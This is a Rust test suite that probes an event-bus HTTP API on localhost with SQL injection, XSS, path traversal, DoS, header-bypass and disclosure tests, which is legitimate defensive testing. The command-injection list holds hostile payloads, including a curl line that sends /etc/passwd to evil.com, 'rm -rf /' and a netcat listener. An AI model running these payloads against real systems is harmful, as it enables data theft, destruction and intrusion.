use reqwest;
use serde_json::json;
use std::time::Duration;
use tokio::time::timeout;
use tracing::{debug, info, warn};

const BASE_URL: &str = "http://localhost:8080";
const TIMEOUT_DURATION: Duration = Duration::from_secs(10);

/// Comprehensive security testing for Event Bus
/// Tests input validation, injection attacks, DoS resistance, and security boundaries
#[tokio::test]
async fn test_sql_injection_attempts() {
    let client = reqwest::Client::new();
    
    // Common SQL injection payloads
    let sql_injection_payloads = vec![
        "'; DROP TABLE events; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO events VALUES ('evil'); --",
        "' OR EXISTS(SELECT * FROM events) --",
        "1'; UPDATE events SET type='hacked' WHERE '1'='1",
        "'; EXEC xp_cmdshell('whoami'); --",
        "' OR SLEEP(5) --",
        "1' AND (SELECT COUNT(*) FROM events) > 0 --",
    ];
    
    for (i, payload) in sql_injection_payloads.iter().enumerate() {
        let event = json!({
            "type": payload,
            "source": payload,
            "payload": {
                "injection_test": payload,
                "nested": {
                    "field": payload
                }
            }
        });
        
        let response = client
            .post(format!("{}/api/v1/events", BASE_URL))
            .json(&event)
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                
                // Server should handle SQL injection attempts gracefully
                // Should not return database errors or expose internal details
                assert!(!body.to_lowercase().contains("sql"));
                assert!(!body.to_lowercase().contains("database"));
                assert!(!body.to_lowercase().contains("table"));
                assert!(!body.to_lowercase().contains("select"));
                assert!(!body.to_lowercase().contains("error"));
                
                debug!("SQL injection test {}: Status {}", i, status);
            }
            Err(e) => {
                debug!("SQL injection test {} failed: {}", i, e);
            }
        }
    }
}

#[tokio::test]
async fn test_xss_injection_attempts() {
    let client = reqwest::Client::new();
    
    // Common XSS injection payloads
    let xss_payloads = vec![
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<select onfocus=alert('xss') autofocus>",
        "<textarea onfocus=alert('xss') autofocus>",
        "<keygen onfocus=alert('xss') autofocus>",
        "<marquee onstart=alert('xss')>",
        "<meter onpointerover=alert('xss')>",
    ];
    
    for (i, payload) in xss_payloads.iter().enumerate() {
        let event = json!({
            "type": "HEARTBEAT",
            "source": payload,
            "payload": {
                "message": payload,
                "html_field": payload,
                "nested": {
                    "xss_test": payload
                }
            }
        });
        
        let response = client
            .post(format!("{}/api/v1/events", BASE_URL))
            .json(&event)
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                
                // Server should sanitize or reject XSS attempts
                // Response should not contain unescaped script tags
                if body.contains("<script>") {
                    warn!("Potential XSS vulnerability detected in response");
                }
                
                debug!("XSS injection test {}: Status {}", i, status);
            }
            Err(e) => {
                debug!("XSS injection test {} failed: {}", i, e);
            }
        }
    }
}

#[tokio::test]
async fn test_command_injection_attempts() {
    let client = reqwest::Client::new();
    
    // Command injection payloads
    let command_injection_payloads = vec![
        "; cat /etc/passwd",
        "| whoami",
        "& ping google.com",
        "; rm -rf /",
        "$(whoami)",
        "`whoami`",
        "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
        "| nc -l 1234",
        "; python -c 'import os; os.system(\"whoami\")'",
        "&& curl http://evil.com",
    ];
    
    for (i, payload) in command_injection_payloads.iter().enumerate() {
        let event = json!({
            "type": "HEARTBEAT",
            "source": format!("cmd_test{}", payload),
            "payload": {
                "command": payload,
                "filename": format!("/tmp/test{}", payload),
                "system_call": payload
            }
        });
        
        let response = client
            .post(format!("{}/api/v1/events", BASE_URL))
            .json(&event)
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                
                // Server should handle command injection attempts safely
                // Should not execute arbitrary commands
                debug!("Command injection test {}: Status {}", i, status);
            }
            Err(e) => {
                debug!("Command injection test {} failed: {}", i, e);
            }
        }
    }
}

#[tokio::test]
async fn test_path_traversal_attempts() {
    let client = reqwest::Client::new();
    
    // Path traversal payloads
    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "file:///etc/passwd",
        "file://C:/windows/system32/drivers/etc/hosts",
    ];
    
    for (i, payload) in path_traversal_payloads.iter().enumerate() {
        let event = json!({
            "type": "HEARTBEAT",
            "source": "path_traversal_test",
            "payload": {
                "filename": payload,
                "path": payload,
                "config_file": payload,
                "nested": {
                    "file_path": payload
                }
            }
        });
        
        let response = client
            .post(format!("{}/api/v1/events", BASE_URL))
            .json(&event)
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                
                // Server should prevent path traversal
                // Should not expose file system contents
                assert!(!body.contains("root:"));
                assert!(!body.contains("# Copyright"));
                assert!(!body.contains("/bin/bash"));
                
                debug!("Path traversal test {}: Status {}", i, status);
            }
            Err(e) => {
                debug!("Path traversal test {} failed: {}", i, e);
            }
        }
    }
}

#[tokio::test]
async fn test_dos_resistance() {
    let client = reqwest::Client::new();
    
    info!("Testing DoS resistance patterns");
    
    // Test 1: Rapid request flooding
    let flood_requests = 1000;
    let mut successful_requests = 0;
    let mut failed_requests = 0;
    
    let start_time = std::time::Instant::now();
    
    for i in 0..flood_requests {
        let event = json!({
            "type": "CONNECTION_TEST",
            "source": "dos_test",
            "payload": {
                "request_id": i
            }
        });
        
        let response = timeout(
            Duration::from_millis(500), // Very short timeout for flood test
            client
                .post(format!("{}/api/v1/events", BASE_URL))
                .json(&event)
                .send()
        ).await;
        
        match response {
            Ok(Ok(resp)) => {
                if resp.status().is_success() {
                    successful_requests += 1;
                } else {
                    failed_requests += 1;
                }
            }
            Ok(Err(_)) | Err(_) => {
                failed_requests += 1;
            }
        }
        
        // No delay - flood as fast as possible
    }
    
    let flood_duration = start_time.elapsed();
    let requests_per_second = flood_requests as f64 / flood_duration.as_secs_f64();
    
    info!("DoS flood test results:");
    info!("  Requests sent: {}", flood_requests);
    info!("  Successful: {}", successful_requests);
    info!("  Failed: {}", failed_requests);
    info!("  Requests per second: {:.2}", requests_per_second);
    info!("  Duration: {:?}", flood_duration);
    
    // Server should remain somewhat responsive even under DoS attack
    // Some requests should succeed, but rate limiting should prevent all from succeeding
    assert!(successful_requests > 0, "Server completely unresponsive during DoS test");
    assert!(failed_requests > successful_requests / 2, "DoS protection may be insufficient");
}

#[tokio::test]
async fn test_resource_exhaustion_attacks() {
    let client = reqwest::Client::new();
    
    // Test 1: Memory exhaustion via large payloads
    info!("Testing memory exhaustion resistance");
    
    let huge_payload = "x".repeat(10 * 1024 * 1024); // 10MB payload
    let event = json!({
        "type": "HEARTBEAT",
        "source": "memory_exhaustion_test",
        "payload": {
            "huge_field": huge_payload
        }
    });
    
    let response = timeout(
        Duration::from_secs(30),
        client
            .post(format!("{}/api/v1/events", BASE_URL))
            .json(&event)
            .send()
    ).await;
    
    match response {
        Ok(Ok(resp)) => {
            // Server should reject or handle huge payloads gracefully
            debug!("Memory exhaustion test: Status {}", resp.status());
        }
        Ok(Err(e)) => {
            debug!("Memory exhaustion test failed: {}", e);
        }
        Err(_) => {
            debug!("Memory exhaustion test timed out");
        }
    }
    
    // Test 2: CPU exhaustion via complex nested structures
    info!("Testing CPU exhaustion resistance");
    
    // Create deeply nested JSON structure
    let mut nested = json!({"end": "value"});
    for i in 0..1000 {
        nested = json!({
            format!("level_{}", i): nested
        });
    }
    
    let cpu_event = json!({
        "type": "HEARTBEAT",
        "source": "cpu_exhaustion_test",
        "payload": nested
    });
    
    let cpu_response = timeout(
        Duration::from_secs(10),
        client
            .post(format!("{}/api/v1/events", BASE_URL))
            .json(&cpu_event)
            .send()
    ).await;
    
    match cpu_response {
        Ok(Ok(resp)) => {
            debug!("CPU exhaustion test: Status {}", resp.status());
        }
        Ok(Err(e)) => {
            debug!("CPU exhaustion test failed: {}", e);
        }
        Err(_) => {
            debug!("CPU exhaustion test timed out");
        }
    }
}

#[tokio::test]
async fn test_input_validation_fuzzing() {
    let client = reqwest::Client::new();
    
    info!("Testing input validation with fuzzing");
    
    // Generate various malformed inputs
    let fuzz_inputs = vec![
        // Random bytes
        vec![0x00, 0xFF, 0x7F, 0x80, 0x01],
        vec![0x41, 0x42, 0x43, 0x00, 0x44],
        
        // Invalid UTF-8 sequences
        vec![0xFF, 0xFE, 0xFD],
        vec![0xC0, 0x80], // Overlong encoding
        vec![0xED, 0xA0, 0x80], // UTF-16 surrogate
        
        // Control characters
        (0..32).collect::<Vec<u8>>(),
        vec![0x7F, 0x80, 0x81, 0x82, 0x83],
    ];
    
    for (i, fuzz_data) in fuzz_inputs.iter().enumerate() {
        // Try to create a string from the fuzz data
        let fuzz_string = String::from_utf8_lossy(fuzz_data);
        
        let event = json!({
            "type": "HEARTBEAT",
            "source": fuzz_string,
            "payload": {
                "fuzz_data": fuzz_string,
                "binary_data": fuzz_data
            }
        });
        
        let response = client
            .post(format!("{}/api/v1/events", BASE_URL))
            .json(&event)
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                // Server should handle fuzzing gracefully without crashing
                debug!("Fuzz test {}: Status {}", i, resp.status());
            }
            Err(e) => {
                debug!("Fuzz test {} failed: {}", i, e);
            }
        }
    }
}

#[tokio::test]
async fn test_authentication_bypass_attempts() {
    let client = reqwest::Client::new();
    
    info!("Testing authentication bypass attempts");
    
    // Test various header manipulation attempts
    let bypass_headers = vec![
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "localhost"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Remote-IP", "localhost"),
        ("X-Client-IP", "127.0.0.1"),
        ("Authorization", "Bearer fake_token"),
        ("Authorization", "Basic YWRtaW46YWRtaW4="), // admin:admin
        ("X-Admin", "true"),
        ("X-Bypass", "true"),
        ("X-Debug", "true"),
        ("User-Agent", "admin"),
        ("X-Forwarded-Proto", "https"),
    ];
    
    for (header_name, header_value) in bypass_headers {
        let event = json!({
            "type": "CONNECTION_TEST",
            "source": "auth_bypass_test",
            "payload": {
                "test_header": format!("{}:{}", header_name, header_value)
            }
        });
        
        let response = client
            .post(format!("{}/api/v1/events", BASE_URL))
            .header(header_name, header_value)
            .json(&event)
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                
                // Headers should not provide special access
                // Response should be consistent with normal requests
                debug!("Auth bypass test {}: {}: Status {}", header_name, header_value, status);
            }
            Err(e) => {
                debug!("Auth bypass test {} failed: {}", header_name, e);
            }
        }
    }
}

#[tokio::test]
async fn test_protocol_security() {
    let client = reqwest::Client::new();
    
    info!("Testing protocol-level security");
    
    // Test HTTP method tampering
    let methods = vec!["GET", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];
    
    for method in methods {
        let request = match method {
            "GET" => client.get(format!("{}/api/v1/events", BASE_URL)),
            "PUT" => client.put(format!("{}/api/v1/events", BASE_URL)),
            "DELETE" => client.delete(format!("{}/api/v1/events", BASE_URL)),
            "PATCH" => client.patch(format!("{}/api/v1/events", BASE_URL)),
            "HEAD" => client.head(format!("{}/api/v1/events", BASE_URL)),
            "OPTIONS" => client.request(reqwest::Method::OPTIONS, format!("{}/api/v1/events", BASE_URL)),
            _ => client.get(format!("{}/api/v1/events", BASE_URL)),
        };
        
        let response = request
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                
                // Only POST should be allowed for events endpoint
                if method != "POST" {
                    assert!(status.is_client_error() || status == reqwest::StatusCode::METHOD_NOT_ALLOWED,
                            "Method {} should not be allowed", method);
                }
                
                debug!("Protocol test {}: Status {}", method, status);
            }
            Err(e) => {
                debug!("Protocol test {} failed: {}", method, e);
            }
        }
    }
}

#[tokio::test]
async fn test_content_type_attacks() {
    let client = reqwest::Client::new();
    
    info!("Testing content-type based attacks");
    
    let malicious_content_types = vec![
        "application/json; charset=utf-7",
        "text/html",
        "application/xml",
        "multipart/form-data",
        "application/x-www-form-urlencoded",
        "text/plain",
        "application/octet-stream",
        "image/jpeg",
        "../etc/passwd",
        "application/json\r\nX-Injected: header",
    ];
    
    for content_type in malicious_content_types {
        let event = json!({
            "type": "HEARTBEAT",
            "source": "content_type_test",
            "payload": {
                "content_type_test": content_type
            }
        });
        
        let response = client
            .post(format!("{}/api/v1/events", BASE_URL))
            .header("Content-Type", content_type)
            .json(&event)
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                
                // Server should handle various content types securely
                debug!("Content-type test '{}': Status {}", content_type, status);
            }
            Err(e) => {
                debug!("Content-type test '{}' failed: {}", content_type, e);
            }
        }
    }
}

#[tokio::test]
async fn test_information_disclosure() {
    let client = reqwest::Client::new();
    
    info!("Testing information disclosure vulnerabilities");
    
    // Test various endpoints for information leakage
    let test_paths = vec![
        "/",
        "/api",
        "/api/v1",
        "/debug",
        "/status",
        "/admin",
        "/config",
        "/version",
        "/docs",
        "/swagger",
        "/api-docs",
        "/.env",
        "/backup",
        "/test",
    ];
    
    for path in test_paths {
        let response = client
            .get(format!("{}{}", BASE_URL, path))
            .timeout(TIMEOUT_DURATION)
            .send()
            .await;
            
        match response {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                
                // Check for information disclosure
                if status.is_success() {
                    // Should not expose sensitive information
                    assert!(!body.to_lowercase().contains("password"));
                    assert!(!body.to_lowercase().contains("secret"));
                    assert!(!body.to_lowercase().contains("private"));
                    assert!(!body.to_lowercase().contains("config"));
                    assert!(!body.to_lowercase().contains("database"));
                    assert!(!body.to_lowercase().contains("error"));
                    assert!(!body.to_lowercase().contains("stack trace"));
                }
                
                debug!("Info disclosure test '{}': Status {}", path, status);
            }
            Err(e) => {
                debug!("Info disclosure test '{}' failed: {}", path, e);
            }
        }
    }
}